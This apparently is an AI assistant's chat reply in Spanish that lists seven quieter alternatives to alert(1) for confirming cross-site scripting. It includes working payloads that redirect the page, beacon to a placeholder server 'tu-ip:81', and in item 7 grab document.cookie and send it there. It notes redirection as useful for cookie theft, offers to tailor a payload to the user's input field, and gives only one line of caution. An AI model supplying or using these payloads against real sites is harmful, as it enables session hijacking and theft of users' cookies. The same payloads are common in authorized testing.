¡Buena decisión! Usar `alert(1)` es muy útil como prueba rápida, pero sí, puede ser molesto. Aquí tienes varias **alternativas silenciosas o menos intrusivas** que puedes usar para probar si el XSS funciona **sin mostrar alertas**:

---

### 🔹 1. Consola del navegador (más silencioso)

```html
<script>console.log('XSS')</script>
```

- Resultado: Solo se imprime en la consola, no molesta visualmente.
    

---

### 🔹 2. Background en el `body` (cambia el color de fondo)

```html
<body style="background:red">
```

- Visual y clara sin generar pop-ups.
    

---

### 🔹 3. Cambio de título de la página

```html
<script>document.title = "XSS found"</script>
```

- Muy útil para ver si se ejecutó sin necesidad de alertas.
    

---

### 🔹 4. Redirección (cuidado)

```html
<script>location.href='https://tu-servidor.com'</script>
```

- Útil para robo de cookies, pero molesto si no estás preparado.
    
- Puedes redirigir a una página de prueba controlada por ti.
    

---

### 🔹 5. Petición silenciosa a tu servidor

```html
<script>fetch('http://tu-ip:81/log?xss=ok')</script>
```

- Ideal para cazar XSS sin mostrar nada.
    
- Puedes escuchar las peticiones con `python3 -m http.server 81`.
    

---

### 🔹 6. Cargar una imagen remota (exfiltración)

```html
<img src="http://tu-ip:81/xss.png" />
```

- Si el navegador carga la imagen, el XSS ocurrió.
    

---

### 🔹 7. Cookie grabber (solo si `HttpOnly` está en `false`)

```html
<script>new Image().src='http://tu-ip:81/log?cookie='+document.cookie</script>
```

- No genera pop-ups, solo manda las cookies al servidor.
    

---

### 🛑 Recomendación

Antes de usar payloads que hacen peticiones salientes, asegúrate de estar en un entorno de pruebas controlado.

¿Quieres que te prepare un payload adaptado a tu campo (por ejemplo input, textarea o parámetro de URL)?